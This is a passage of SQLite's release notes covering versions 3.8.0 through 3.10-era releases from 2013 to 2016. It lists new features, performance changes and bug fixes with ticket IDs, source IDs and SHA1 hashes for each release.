\"2016-01-06 11:01:07 fd0a50f0797d154fefff724624f00548b5320566\" SHA1 for sqlite3.c: b92ca988ebb6df02ac0c8f866dbf3256740408ac 2015-11-02 (3.9.2) Fix the schema parser so that it interprets certain (obscure and ill-formed) CREATE TABLE statements the same as legacy. Fix for ticket ac661962a2aeab3c331 Fix a query planner problem that could result in an incorrect answer due to the use of automatic indexing in subqueries in the FROM clause of a correlated scalar subqueries. Fix for ticket 8a2adec1. SQLITE_SOURCE_ID: \"2015-11-02 18:31:45 bda77dda9697c463c3d0704014d51627fceee328\" SHA1 for sqlite3.c: 1c4013876f50bbaa3e6f0f98e0147c76287684c1 2015-10-16 (3.9.1) Fix the json1 extension so that it does not recognize ASCII form-feed as a whitespace character, in order to comply with RFC-7159. Fix for ticket 57eec374ae1d0a1d Add a few #ifdef and build script changes to address compilation issues that appeared after the 3.9.0 release. SQLITE_SOURCE_ID: \"\"2015-10-16 17:31:12 767c1727fec4ce11b83f25b3f1bfcfe68a2c8b02\" SHA1 for sqlite3.c: 5e6d1873a32d82c2cf8581f143649940cac8ae49 2015-10-14 (3.9.0) Policy Changes: The version numbering conventions for SQLite are revised to use the emerging standard of semantic versioning. New Features And Enhancements: Added the json1 extension module in the source tree, and in the amalgamation. Enable support using the SQLITE_ENABLE_JSON1 compile-time option. Added Full Text Search version 5 (FTS5) to the amalgamation, enabled using SQLITE_ENABLE_FTS5. FTS5 will be considered \"experimental\" (subject to incompatible changes) for at least one more release cycle. The CREATE VIEW statement now accepts an optional list of column names following the view name. Added support for indexes on expressions. Added support for table-valued functions in the FROM clause of a SELECT statement. Added support for eponymous virtual tables. A VIEW may now reference undefined tables and functions when initially created. Missing tables and functions are reported when the VIEW is used in a query. Added the sqlite3_value_subtype() and sqlite3_result_subtype() interfaced (used by the json1 extension). The query planner is now able to use partial indexes that contain AND-connected terms in the WHERE clause. The sqlite3_analyzer.exe utility is updated to report the depth of each btree and to show the average fanout for indexes and WITHOUT ROWID tables. Enhanced the dbstat virtual table so that it can be used as a table-valued function where the argument is the schema to be analyzed. Other changes: The sqlite3_memory_alarm() interface, which has been deprecated and undocumented for 8 years, is changed into a no-op. Important fixes: Fixed a critical bug in the SQLite Encryption Extension that could cause the database to become unreadable and unrecoverable if a VACUUM command changed the size of the encryption nonce. Added a memory barrier in the implementation of sqlite3_initialize() to help ensure that it is thread-safe. Fix the OR optimization so that it always ignores subplans that do not use an index. Do not apply the WHERE-clause pushdown optimization on terms that originate in the ON or USING clause of a LEFT JOIN. Fix for ticket c2a19d81652f40568c. SQLITE_SOURCE_ID: \"2015-10-14 12:29:53 a721fc0d89495518fe5612e2e3bbc60befd2e90d\" SHA1 for sqlite3.c: c03e47e152ddb9c342b84ffb39448bf4a2bd4288 2015-07-29 (3.8.11.1) Restore an undocumented side-effect of PRAGMA cache_size: force the database schema to be parsed if the database has not been previously accessed. Fix a long-standing problem in sqlite3_changes() for WITHOUT ROWID tables that was reported a few hours after the 3.8.11 release. SQLITE_SOURCE_ID: \"2015-07-29 20:00:57 cf538e2783e468bbc25e7cb2a9ee64d3e0e80b2f\" SHA1 for sqlite3.c: 3be71d99121fe5b17f057011025bcf84e7cc6c84 2015-07-27 (3.8.11) Added the experimental RBU extension. Note that this extension is experimental and subject to change in incompatible ways. Added the experimental FTS5 extension. Note that this extension is experimental and subject to change in incompatible ways. Added the sqlite3_value_dup() and sqlite3_value_free() interfaces. Enhance the spellfix1 extension to support ON CONFLICT clauses. The IS operator is now able to drive indexes. Enhance the query planner to permit automatic indexing on FROM-clause subqueries that are implemented by co-routine. Disallow the use of \"rowid\" in common table expressions. Added the PRAGMA cell_size_check command for better and earlier detection of database file corruption. Added the matchinfo 'b' flag to the matchinfo() function in FTS3. Improved fuzz-testing of database files, with fixes for problems found. Add the fuzzcheck test program and automatically run this program using both SQL and database test cases on \"make test\". Added the SQLITE_MUTEX_STATIC_VFS1 static mutex and use it in the Windows VFS. The sqlite3_profile() callback is invoked (by sqlite3_reset() or sqlite3_finalize()) for statements that did not run to completion. Enhance the page cache so that it can preallocate a block of memory to use for the initial set page cache lines. Set the default preallocation to 100 pages. Yields about a 5% performance increase on common workloads. Miscellaneous micro-optimizations result in 22.3% more work for the same number of CPU cycles relative to the previous release. SQLite now runs twice as fast as version 3.8.0 and three times as fast as version 3.3.9. (Measured using cachegrind on the speedtest1.c workload on Ubuntu 14.04 x64 with gcc 4.8.2 and -Os. Your performance may vary.) Added the sqlite3_result_zeroblob64() and sqlite3_bind_zeroblob64() interfaces. Important bug fixes: Fix CREATE TABLE AS so that columns of type TEXT never end up holding an INT value. Ticket f2ad7de056ab1dc9200 Fix CREATE TABLE AS so that it does not leave NULL entries in the sqlite_master table if the SELECT statement on the right-hand side aborts with an error. Ticket 873cae2b6e25b Fix the skip-scan optimization so that it works correctly when the OR optimization is used on WITHOUT ROWID tables. Ticket 8fd39115d8f46 Fix the sqlite3_memory_used() and sqlite3_memory_highwater() interfaces so that they actually do provide a 64-bit answer. Hashes: SQLITE_SOURCE_ID: \"2015-07-27 13:49:41 b8e92227a469de677a66da62e4361f099c0b79d0\" SHA1 for sqlite3.c: 719f6891abcd9c459b5460b191d731cd12a3643e 2015-05-20 (3.8.10.2) Fix an index corruption issue introduced by version 3.8.7. An index with a TEXT key can be corrupted by an INSERT into the corresponding table if the table has two nested triggers that convert the key value to INTEGER and back to TEXT again. Ticket 34cd55d68e0 SQLITE_SOURCE_ID: \"2015-05-20 18:17:19 2ef4f3a5b1d1d0c4338f8243d40a2452cc1f7fe4\" SHA1 for sqlite3.c: 638abb77965332c956dbbd2c8e4248e84da4eb63 2015-05-09 (3.8.10.1) Make sqlite3_compileoption_used() responsive to the SQLITE_ENABLE_DBSTAT_VTAB compile-time option. Fix a harmless warning in the command-line shell on some versions of MSVC. Fix minor issues with the dbstat virtual table. SQLITE_SOURCE_ID: \"2015-05-09 12:14:55 05b4b1f2a937c06c90db70c09890038f6c98ec40\" SHA1 for sqlite3.c: 85e4e1c08c7df28ef61bb9759a0d466e0eefbaa2 2015-05-07 (3.8.10) Added the sqldiff.exe utility program for computing the differences between two SQLite database files. Added the matchinfo y flag to the matchinfo() function of FTS3. Performance improvements for ORDER BY, VACUUM, CREATE INDEX, PRAGMA integrity_check, and PRAGMA quick_check. Fix many obscure problems discovered while SQL fuzzing. Identify all methods for important objects in the interface documentation. (example) Made the American Fuzzy Lop fuzzer a standard part of SQLite's testing strategy. Add the \".binary\" and \".limits\" commands to the command-line shell. Make the dbstat virtual table part of standard builds when compiled with the SQLITE_ENABLE_DBSTAT_VTAB option. SQLITE_SOURCE_ID: \"2015-05-07 11:53:08 cf975957b9ae671f34bb65f049acf351e650d437\" SHA1 for sqlite3.c: 0b34f0de356a3f21b9dfc761f3b7821b6353c570 2015-04-08 (3.8.9) Add VxWorks-7 as an officially supported and tested platform. Added the sqlite3_status64() interface. Fix memory size tracking so that it works even if SQLite uses more than 2GiB of memory. Added the PRAGMA index_xinfo command. Fix a potential 32-bit integer overflow problem in the sqlite3_blob_read() and sqlite3_blob_write() interfaces. Ensure that prepared statements automatically reset on extended error codes of SQLITE_BUSY and SQLITE_LOCKED even when compiled using SQLITE_OMIT_AUTORESET. Correct miscounts in the sqlite3_analyzer.exe utility related to WITHOUT ROWID tables. Added the \".dbinfo\" command to the command-line shell. Improve the performance of fts3/4 queries that use the OR operator and at least one auxiliary fts function. Fix a bug in the fts3 snippet() function causing it to omit leading separator characters from snippets that begin with the first token in a column. SQLITE_SOURCE_ID: \"2015-04-08 12:16:33 8a8ffc862e96f57aa698f93de10dee28e69f6e09\" SHA1 for sqlite3.c: 49f1c3ae347e1327b5aaa6c7f76126bdf09c6f42 2015-02-25 (3.8.8.3) Fix a bug (ticket 2326c258d02ead33) that can lead to incorrect results if the qualifying constraint of a partial index appears in the ON clause of a LEFT JOIN. Added the ability to link against the \"linenoise\" command-line editing library in unix builds of the command-line shell. SQLITE_SOURCE_ID: \"2015-02-25 13:29:11 9d6c1880fb75660bbabd693175579529785f8a6b\" SHA1 for sqlite3.c: 74ee38c8c6fd175ec85a47276dfcefe8a262827a 2015-01-30 (3.8.8.2) Enhance sqlite3_wal_checkpoint_v2(TRUNCATE) interface so that it truncates the WAL file even if there is no checkpoint work to be done. SQLITE_SOURCE_ID: \"2015-01-30 14:30:45 7757fc721220e136620a89c9d28247f28bbbc098\" SHA1 for sqlite3.c: 85ce79948116aa9a087ec345c9d2ce2c1d3cd8af 2015-01-20 (3.8.8.1) Fix a bug in the sorting logic, present since version 3.8.4, that can cause output to appear in the wrong order on queries that contains an ORDER BY clause, a LIMIT clause, and that have approximately 60 or more columns in the result set. Ticket f97c4637102a3ae72b79. SQLITE_SOURCE_ID: \"2015-01-20 16:51:25 f73337e3e289915a76ca96e7a05a1a8d4e890d55\" SHA1 for sqlite3.c: 33987fb50dcc09f1429a653d6b47672f5a96f19e 2015-01-16 (3.8.8) New Features: Added the PRAGMA data_version command that can be used to determine if a database file has been modified by another process. Added the SQLITE_CHECKPOINT_TRUNCATE option to the sqlite3_wal_checkpoint_v2() interface, with corresponding enhancements to PRAGMA wal_checkpoint. Added the sqlite3_stmt_scanstatus() interface, available only when compiled with SQLITE_ENABLE_STMT_SCANSTATUS. The sqlite3_table_column_metadata() is enhanced to work correctly on WITHOUT ROWID tables and to check for the existence of a a table if the column name parameter is NULL. The interface is now also included in the build by default, without requiring the SQLITE_ENABLE_COLUMN_METADATA compile-time option. Added the SQLITE_ENABLE_API_ARMOR compile-time option. Added the SQLITE_REVERSE_UNORDERED_SELECTS compile-time option. Added the SQLITE_SORTER_PMASZ compile-time option and SQLITE_CONFIG_PMASZ start-time option. Added the SQLITE_CONFIG_PCACHE_HDRSZ option to sqlite3_config() which makes it easier for applications to determine the appropriate amount of memory for use with SQLITE_CONFIG_PAGECACHE. The number of rows in a VALUES clause is no longer limited by SQLITE_LIMIT_COMPOUND_SELECT. Added the eval.c loadable extension that implements an eval() SQL function that will recursively evaluate SQL. Performance Enhancements: Reduce the number of memcpy() operations involved in balancing a b-tree, for 3.2% overall performance boost. Improvements to cost estimates for the skip-scan optimization. The automatic indexing optimization is now capable of generating a partial index if that is appropriate. Bug fixes: Ensure durability following a power loss with \"PRAGMA journal_mode=TRUNCATE\" by calling fsync() right after truncating the journal file. The query planner now recognizes that any column in the right-hand table of a LEFT JOIN can be NULL, even if that column has a NOT NULL constraint. Avoid trying to optimize out NULL tests in those cases. Fix for ticket 6f2222d550f5b0ee7ed. Make sure ORDER BY puts rows in ascending order even if the DISTINCT operator is implemented using a descending index. Fix for ticket c5ea805691bfc4204b1cb9e. Fix data races that might occur under stress when running with many threads in shared cache mode where some of the threads are opening and closing connections. Fix obscure crash bugs found by american fuzzy lop. Ticket a59ae93ee990a55. Work around a GCC optimizer bug (for gcc 4.2.1 on MacOS 10.7) that caused the R-Tree extension to compute incorrect results when compiled with -O3. Other changes: Disable the use of the strchrnul() C-library routine unless it is specifically enabled using the -DHAVE_STRCHRNULL compile-time option. Improvements to the effectiveness and accuracy of the likelihood(), likely(), and unlikely() SQL hint functions. SQLITE_SOURCE_ID: \"2015-01-16 12:08:06 7d68a42face3ab14ed88407d4331872f5b243fdf\" SHA1 for sqlite3.c: 91aea4cc722371d58aae3d22e94d2a4165276905 2014-12-09 (3.8.7.4) Bug fix: Add in a mutex that was omitted from the previous release. SQLITE_SOURCE_ID: \"2014-12-09 01:34:36 f66f7a17b78ba617acde90fc810107f34f1a1f2e\" SHA1 for sqlite3.c: 0a56693a3c24aa3217098afab1b6fecccdedfd23 2014-12-05 (3.8.7.3) Bug fix: Ensure the cached KeyInfo objects (an internal abstraction not visible to the application) do not go stale when operating in shared cache mode and frequently closing and reopening some database connections while leaving other database connections on the same shared cache open continuously. Ticket e4a18565a36884b00edf. Bug fix: Recognize that any column in the right-hand table of a LEFT JOIN can be NULL even if the column has a NOT NULL constraint. Do not apply optimizations that assume the column is never NULL. Ticket 6f2222d550f5b0ee7ed. SQLITE_SOURCE_ID: \"2014-12-05 22:29:24 647e77e853e81a5effeb4c33477910400a67ba86\" SHA1 for sqlite3.c: 3ad2f5ba3a4a3e3e51a1dac9fda9224b359f0261 2014-11-18 (3.8.7.2) Enhance the ROLLBACK command so that pending queries are allowed to continue as long as the schema is unchanged. Formerly, a ROLLBACK would cause all pending queries to fail with an SQLITE_ABORT or SQLITE_ABORT_ROLLBACK error. That error is still returned if the ROLLBACK modifies the schema. Bug fix: Make sure that NULL results from OP_Column are fully and completely NULL and do not have the MEM_Ephem bit set. Ticket 094d39a4c95ee4. Bug fix: The %c format in sqlite3_mprintf() is able to handle precisions greater than 70. Bug fix: Do not automatically remove the DISTINCT keyword from a SELECT that forms the right-hand side of an IN operator since it is necessary if the SELECT also contains a LIMIT. Ticket db87229497. SQLITE_SOURCE_ID: \"2014-11-18 20:57:56 2ab564bf9655b7c7b97ab85cafc8a48329b27f93\" SHA1 for sqlite3.c: b2a68d5783f48dba6a8cb50d8bf69b238c5ec53a 2014-10-29 (3.8.7.1) In PRAGMA journal_mode=TRUNCATE mode, call fsync() immediately after truncating the journal file to ensure that the transaction is durable across a power loss. Fix an assertion fault that can occur when updating the NULL value of a field at the end of a table that was added using ALTER TABLE ADD COLUMN. Do not attempt to use the strchrnul() function from the standard C library unless the HAVE_STRCHRNULL compile-time option is set. Fix a couple of problems associated with running an UPDATE or DELETE on a VIEW with a rowid in the WHERE clause. SQLITE_SOURCE_ID: \"2014-10-29 13:59:56 3b7b72c4685aa5cf5e675c2c47ebec10d9704221\" SHA1 for sqlite3.c: 2d25bd1a73dc40f538f3a81c28e6efa5999bdf0c 2014-10-17 (3.8.7) Performance Enhancements: Many micro-optimizations result in 20.3% more work for the same number of CPU cycles relative to the previous release. The cumulative performance increase since version 3.8.0 is 61%. (Measured using cachegrind on the speedtest1.c workload on Ubuntu 13.10 x64 with gcc 4.8.1 and -Os. Your performance may vary.) The sorter can use auxiliary helper threads to increase real-time response. This feature is off by default and may be enabled using the PRAGMA threads command or the SQLITE_DEFAULT_WORKER_THREADS compile-time option. Enhance the skip-scan optimization so that it is able to skip index terms that occur in the middle of the index, not just as the left-hand side of the index. Improved optimization of CAST operators. Various improvements in how the query planner uses sqlite_stat4 information to estimate plan costs. New Features: Added new interfaces with 64-bit length parameters: sqlite3_malloc64(), sqlite3_realloc64(), sqlite3_bind_blob64(), sqlite3_result_blob64(), sqlite3_bind_text64(), and sqlite3_result_text64(). Added the new interface sqlite3_msize() that returns the size of a memory allocation obtained from sqlite3_malloc64() and its variants. Added the SQLITE_LIMIT_WORKER_THREADS option to sqlite3_limit() and PRAGMA threads command for configuring the number of available worker threads. The spellfix1 extension allows the application to optionally specify the rowid for each INSERT. Added the User Authentication extension. Bug Fixes: Fix a bug in the partial index implementation that might result in an incorrect answer if a partial index is used in a subquery or in a view. Ticket 98d973b8f5. Fix a query planner bug that might cause a table to be scanned in the wrong direction (thus reversing the order of output) when a DESC index is used to implement the ORDER BY clause on a query that has an identical GROUP BY clause. Ticket ba7cbfaedc7e6. Fix a bug in sqlite3_trace() that was causing it to sometimes fail to print an SQL statement if that statement needed to be re-prepared. Ticket 11d5aa455e0d98f3c1e6a08 Fix a faulty assert() statement. Ticket 369d57fb8e5ccdff06f1 Test, Debug, and Analysis Changes: Show ASCII-art abstract syntax tree diagrams using the \".selecttrace\" and \".wheretrace\" commands in the command-line shell when compiled with SQLITE_DEBUG, SQLITE_ENABLE_SELECTTRACE, and SQLITE_ENABLE_WHERETRACE. Also provide the sqlite3TreeViewExpr() and sqlite3TreeViewSelect() entry points that can be invoked from with the debugger to show the parse tree when stopped at a breakpoint. Drop support for SQLITE_ENABLE_TREE_EXPLAIN. The SELECTTRACE mechanism provides more useful diagnostics information. New options to the command-line shell for configuring auxiliary memory usage: --pagecache, --lookaside, and --scratch. SQLITE_SOURCE_ID: \"2014-10-17 11:24:17 e4ab094f8afce0817f4074e823fabe59fc29ebb4\" SHA1 for sqlite3.c: 56dcf5e931a9e1fa12fc2d600cd91d3bf9b639cd 2014-08-15 (3.8.6) Added support for hexadecimal integer literals in the SQL parser. (Ex: 0x123abc) Enhanced the PRAGMA integrity_check command to detect UNIQUE and NOT NULL constraint violations. Increase the maximum value of SQLITE_MAX_ATTACHED from 62 to 125. Increase the timeout in WAL mode before issuing an SQLITE_PROTOCOL error from 1 second to 10 seconds. Added the likely(X) SQL function. The unicode61 tokenizer is now included in FTS4 by default. Trigger automatic reprepares on all prepared statements when ANALYZE is run. Added a new loadable extension source code file to the source tree: fileio.c Add extension functions readfile(X) and writefile(X,Y) (using code copy/pasted from fileio.c in the previous bullet) to the command-line shell. Added the .fullschema dot-command to the command-line shell. Performance Enhancements: Deactivate the DISTINCT keyword on subqueries on the right-hand side of the IN operator. Add the capability of evaluating an IN operator as a sequence of comparisons as an alternative to using a table lookup. Use the sequence of comparisons implementation in circumstances where it is likely to be faster, such as when the right-hand side of the IN operator is small and/or changes frequently. The query planner now uses sqlite_stat4 information (created by ANALYZE) to help determine if the skip-scan optimization is appropriate. Ensure that the query planner never tries to use a self-made transient index in place of a schema-defined index. Other minor tweaks to improve the quality of VDBE code. Bug Fixes: Fix a bug in CREATE UNIQUE INDEX, introduced when WITHOUT ROWID support added in version 3.8.2, that allows a non-unique NOT NULL column to be given a UNIQUE index. Ticket 9a6daf340df99ba93c Fix a bug in R-Tree extension, introduced in the previous release, that can cause an incorrect results for queries that use the rowid of the R-Tree on the left-hand side of an IN operator. Ticket d2889096e7bdeac6. Fix the sqlite3_stmt_busy() interface so that it gives the correct answer for ROLLBACK statements that have been stepped but never reset. Fix a bug in that would cause a null pointer to be dereferenced if a column with a DEFAULT that is an aggregate function tried to usee its DEFAULT. Ticket 3a88d85f36704eebe1 CSV output from the command-line shell now always uses CRNL for the row separator and avoids inserting CR in front of NLs contained in data. Fix a column affinity problem with the IN operator. Ticket 9a8b09f8e6. Fix the ANALYZE command so that it adds correct samples for WITHOUT ROWID tables in the sqlite_stat4 table. Ticket b2fa5424e6fcb15. SQLITE_SOURCE_ID: \"2014-08-15 11:46:33 9491ba7d738528f168657adb43a198238abde19e\" SHA1 for sqlite3.c: 72c64f05cd9babb9c0f9b3c82536d83be7804b1c 2014-06-04 (3.8.5) Added support for partial sorting by index. Enhance the query planner so that it always prefers an index that uses a superset of WHERE clause terms relative to some other index. Improvements to the automerge command of FTS4 to better control the index size for a full-text index that is subject to a large number of updates. Added the sqlite3_rtree_query_callback() interface to R-Tree extension Added new URI query parameters \"nolock\" and \"immutable\". Use less memory by not remembering CHECK constraints on read-only database connections. Enable the OR optimization for WITHOUT ROWID tables. Render expressions of the form \"x IN (?)\" (with a single value in the list on the right-hand side of the IN operator) as if they where \"x==?\", Similarly optimize \"x NOT IN (?)\" Add the \".system\" and \".once\" commands to the command-line shell. Added the SQLITE_IOCAP_IMMUTABLE bit to the set of bits that can be returned by the xDeviceCharacteristics method of a VFS. Added the SQLITE_TESTCTRL_BYTEORDER test control. Bug Fixes: OFFSET clause ignored on queries without a FROM clause. Ticket 07d6a0453d Assertion fault on queries involving expressions of the form \"x IN (?)\". Ticket e39d032577. Incorrect column datatype reported. Ticket a8a0d2996a Duplicate row returned on a query against a table with more than 16 indices, each on a separate column, and all used via OR-connected constraints. Ticket 10fb063b11 Partial index causes assertion fault on UPDATE OR REPLACE. Ticket 2ea3e9fe63 Crash when calling undocumented SQL function sqlite_rename_parent() with NULL parameters. Ticket 264b970c43 ORDER BY ignored if the query has an identical GROUP BY. Ticket b75a9ca6b0 The group_concat(x,'') SQL function returns NULL instead of an empty string when all inputs are empty strings. Ticket 55746f9e65 Fix a bug in the VDBE code generator that caused crashes when doing an INSERT INTO ... SELECT statement where the number of columns being inserted is larger than the number of columns in the destination table. Ticket e9654505cfd Fix a problem in CSV import in the command-line shell where if the leftmost field of the first row in the CSV file was both zero bytes in size and unquoted no data would be imported. Fix a problem in FTS4 where the left-most column that contained the notindexed column name as a prefix was not indexed rather than the column whose name matched exactly. Fix the sqlite3_db_readonly() interface so that it returns true if the database is read-only due to the file format write version number being too large. SQLITE_SOURCE_ID: \"2014-06-04 14:06:34 b1ed4f2a34ba66c29b130f8d13e9092758019212\" SHA1 for sqlite3.c: 7bc194957238c61b1a47f301270286be5bc5208c 2014-04-03 (3.8.4.3) Add a one-character fix for a problem that might cause incorrect query results on a query that mixes DISTINCT, GROUP BY in a subquery, and ORDER BY. Ticket 98825a79ce14. SQLITE_SOURCE_ID: \"2014-04-03 16:53:12 a611fa96c4a848614efe899130359c9f6fb889c3\" SHA1 for sqlite3.c: 310a1faeb9332a3cd8d1f53b4a2e055abf537bdc 2014-03-26 (3.8.4.2) Fix a potential buffer overread that could result when trying to search a corrupt database file. SQLITE_SOURCE_ID: \"2014-03-26 18:51:19 02ea166372bdb2ef9d8dfbb05e78a97609673a8e\" SHA1 for sqlite3.c: 4685ca86c2ea0649ed9f59a500013e90b3fe6d03 2014-03-11 (3.8.4.1) Work around a C-preprocessor macro conflict that breaks the build for some configurations with Microsoft Visual Studio. When computing the cost of the skip-scan optimization, take into account the fact that multiple seeks are required. SQLITE_SOURCE_ID: \"2014-03-11 15:27:36 018d317b1257ce68a92908b05c9c7cf1494050d0\" SHA1 for sqlite3.c: d5cd1535053a50aa8633725e3595740b33709ac5 2014-03-10 (3.8.4) Code optimization and refactoring for improved performance. Add the \".clone\" and \".save\" commands to the command-line shell. Update the banner on the command-line shell to alert novice users when they are using an ephemeral in-memory database. Fix editline support in the command-line shell. Add support for coverage testing of VDBE programs using the SQLITE_TESTCTRL_VDBE_COVERAGE verb of sqlite3_test_control(). Update the _FILE_OFFSET_BITS macro so that builds work again on QNX. Change the datatype of SrcList.nSrc from type u8 to type int to work around an issue in the C compiler on AIX. Get extension loading working on Cygwin. Bug fix: Fix the char() SQL function so that it returns an empty string rather than an \"out of memory\" error when called with zero arguments. Bug fix: DISTINCT now recognizes that a zeroblob and a blob of all 0x00 bytes are the same thing. Ticket [fccbde530a] Bug fix: Compute the correct answer for queries that contain an IS NOT NULL term in the WHERE clause and also contain an OR term in the WHERE clause and are compiled with SQLITE_ENABLE_STAT4. Ticket [4c86b126f2] Bug fix: Make sure \"rowid\" columns are correctly resolved in joins between normal tables and WITHOUT ROWID tables. Ticket [c34d0557f7] Bug fix: Make sure the same temporary registers are not used in concurrent co-routines used to implement compound SELECT statements containing ORDER BY clauses, as such use can lead to incorrect answers. Ticket [8c63ff0eca] Bug fix: Ensure that \"ORDER BY random()\" clauses do not get optimized out. Ticket [65bdeb9739] Bug fix: Repair a name-resolution error that can occur in sub-select statements contained within a TRIGGER. Ticket [4ef7e3cfca] Bug fix: Fix column default values expressions of the form \"DEFAULT(-(-9223372036854775808))\" so that they work correctly, initializing the column to a floating point value approximately equal to +9223372036854775808.0. SQLITE_SOURCE_ID: \"2014-03-10 12:20:37 530a1ee7dc2435f80960ce4710a3c2d2bfaaccc5\" SHA1 for sqlite3.c: b0c22e5f15f5ba2afd017ecd990ea507918afe1c 2014-02-11 (3.8.3.1) Fix a bug (ticket 4c86b126f2) that causes rows to go missing on some queries with OR clauses and IS NOT NULL operators in the WHERE clause, when the SQLITE_ENABLE_STAT3 or SQLITE_ENABLE_STAT4 compile-time options are used. Fix a harmless compiler warning that was causing problems for VS2013. SQLITE_SOURCE_ID: \"2014-02-11 14:52:19 ea3317a4803d71d88183b29f1d3086f46d68a00e\" SHA1 for sqlite3.c: 990004ef2d0eec6a339e4caa562423897fe02bf0 2014-02-03 (3.8.3) Added support for common table expressions and the WITH clause. Added the printf() SQL function. Added SQLITE_DETERMINISTIC as an optional bit in the 4th argument to the sqlite3_create_function() and related interfaces, providing applications with the ability to create new functions that can be factored out of inner loops when they have constant arguments. Add SQLITE_READONLY_DBMOVED error code, returned at the beginning of a transaction, to indicate that the underlying database file has been renamed or moved out from under SQLite. Allow arbitrary expressions, including function calls and subqueries, in the filename argument to ATTACH. Allow a VALUES clause to be used anywhere a SELECT statement is valid. Reseed the PRNG used by sqlite3_randomness(N,P) when invoked with N==0. Automatically reseed after a fork() on unix. Enhance the spellfix1 virtual table so that it can search efficiently by rowid. Performance enhancements. Improvements to the comments in the VDBE byte-code display when running EXPLAIN. Add the \"%token_class\" directive to Lemon parser generator and use it to simplify the grammar. Change the Lemon source code to avoid calling C-library functions that OpenBSD considers dangerous. (Ex: sprintf). Bug fix: In the command-line shell CSV import feature, do not end a field when an escaped double-quote occurs at the end of a CRLN line. SQLITE_SOURCE_ID: \"2014-02-03 13:52:03 e816dd924619db5f766de6df74ea2194f3e3b538\" SHA1 for sqlite3.c: 98a07da78f71b0275e8d9c510486877adc31dbee 2013-12-06 (3.8.2) Changed the defined behavior for the CAST expression when floating point values greater than +9223372036854775807 are cast into into integers so that the result is the largest possible integer, +9223372036854775807, instead of the smallest possible integer, -9223372036854775808. After this change, CAST(9223372036854775809.0 as INT) yields +9223372036854775807 instead of -9223372036854775808. Potentially Incompatible Change! Added support for WITHOUT ROWID tables. Added the skip-scan optimization to the query planner. Extended the virtual table interface, and in particular the sqlite3_index_info object to allow a virtual table to report its estimate on the number of rows that will be returned by a query. Update the R-Tree extension to make use of the enhanced virtual table interface. Add the SQLITE_ENABLE_EXPLAIN_COMMENTS compile-time option. Enhanced the comments that are inserted into EXPLAIN output when the SQLITE_ENABLE_EXPLAIN_COMMENTS compile-time option is enabled. Performance enhancements in the VDBE, especially to the OP_Column opcode. Factor constant subexpressions in inner loops out to the initialization code in prepared statements. Enhanced the \".explain\" output formatting of the command-line shell so that loops are indented to better show the structure of the program. Enhanced the \".timer\" feature of the command-line shell so that it shows wall-clock time in addition to system and user times. SQLITE_SOURCE_ID: \"2013-12-06 14:53:30 27392118af4c38c5203a04b8013e1afdb1cebd0d\" SHA1 for sqlite3.c: 6422c7d69866f5ea3db0968f67ee596e7114544e 2013-10-17 (3.8.1) Added the unlikely() and likelihood() SQL functions to be used as hints to the query planner. Enhancements to the query planner: Take into account the fact WHERE clause terms that cannot be used with indices still probably reduce the number of output rows. Estimate the sizes of table and index rows and use the smallest applicable B-Tree for full scans and \"count(*)\" operations. Added the soft_heap_limit pragma. Added support for SQLITE_ENABLE_STAT4 Added support for \"sz=NNN\" parameters at the end of sqlite_stat1.stat fields used to specify the average length in bytes for table and index rows. Avoid running foreign-key constraint checks on an UPDATE if none of the modified columns are associated with foreign keys. Added the SQLITE_MINIMUM_FILE_DESCRIPTOR compile-time option Added the win32-longpath VFS on windows, permitting filenames up to 32K characters in length. The Date And Time Functions are enhanced so that the current time (ex: julianday('now')) is always the same for multiple function invocations within the same sqlite3_step() call. Add the \"totype.c\" extension, implementing the tointeger() and toreal() SQL functions. FTS4 queries are better able to make use of docid<$limit constraints to limit the amount of I/O required. Added the hidden fts4aux languageid column to the fts4aux virtual table. The VACUUM command packs the database about 1% tighter. The sqlite3_analyzer utility program is updated to provide better descriptions and to compute a more accurate estimate for \"Non-sequential pages\" Refactor the implementation of PRAGMA statements to improve parsing performance. The directory used to hold temporary files on unix can now be set using the SQLITE_TMPDIR environment variable, which takes precedence over the TMPDIR environment variable. The sqlite3_temp_directory global variable still has higher precedence than both environment variables, however. Added the PRAGMA stats statement. Bug fix: Return the correct answer for \"SELECT count(*) FROM table\" even if there is a partial index on the table. Ticket a5c8ed66ca. SQLITE_SOURCE_ID: \"2013-10-17 12:57:35 c78be6d786c19073b3a6730dfe3fb1be54f5657a\" SHA1 for sqlite3.c: 0a54d76566728c2ba96292a49b138e4f69a7c391 2013-09-03 (3.8.0.2) Fix a bug in the optimization that attempts to omit unused LEFT JOINs SQLITE_SOURCE_ID: \"2013-09-03 17:11:13 7dd4968f235d6e1ca9547cda9cf3bd570e1609ef\" SHA1 for sqlite3.c: 6cf0c7b46975a87a0dc3fba69c229a7de61b0c21 2013-08-29 (3.8.0.1) Fix an off-by-one error that caused quoted empty string at the end of a CRNL-terminated line of CSV input to be misread by the command-line shell. Fix a query planner bug involving a LEFT JOIN with a BETWEEN or LIKE/GLOB constraint and then another INNER JOIN to the right that involves an OR constraint. Fix a query planner bug that could result in a segfault when querying tables with a UNIQUE or PRIMARY KEY constraint with more than four columns. SQLITE_SOURCE_ID: \"2013-08-29 17:35:01 352362bc01660edfbda08179d60f09e2038a2f49\" SHA1 for sqlite3.c: 99906bf63e6cef63d6f3d7f8526ac4a70e76559e 2013-08-26 (3.8.0) Add support for partial indexes Cut-over to the next generation query planner for faster and better query plans. The EXPLAIN QUERY PLAN output no longer shows an estimate of the number of rows generated by each loop in a join. Added the FTS4 notindexed option, allowing non-indexed columns in an FTS4 table. Added the SQLITE_STMTSTATUS_VM_STEP option to sqlite3_stmt_status(). Added the cache_spill pragma. Added the query_only pragma. Added the defer_foreign_keys pragma and the sqlite3_db_status(db, SQLITE_DBSTATUS_DEFERRED_FKS,...) C-language interface. Added the \"percentile()\" function as a loadable extension in the ext/misc subdirectory of the source tree. Added the SQLITE_ALLOW_URI_AUTHORITY compile-time option. Add the sqlite3_cancel_auto_extension(X) interface. A running SELECT statement that lacks a FROM clause (or any other statement that never reads or writes from any database file) will not prevent a read transaction from closing. Add the SQLITE_DEFAULT_AUTOMATIC_INDEX compile-time option. Setting this option to 0 disables automatic indices by default. Issue an SQLITE_WARNING_AUTOINDEX warning on the SQLITE_CONFIG_LOG whenever the query planner uses an automatic index. Added the SQLITE_FTS3_MAX_EXPR_DEPTH compile-time option. Added an optional 5th parameter defining the collating sequence to the next_char() extension SQL function. The SQLITE_BUSY_SNAPSHOT extended error code is returned in WAL mode when a read transaction cannot be upgraded to a write transaction because the read is on an older snapshot. Enhancements to the sqlite3_analyzer utility program to provide size information separately for each individual index of a table, in addition to the aggregate size. Allow read transactions to be freely opened and closed by SQL 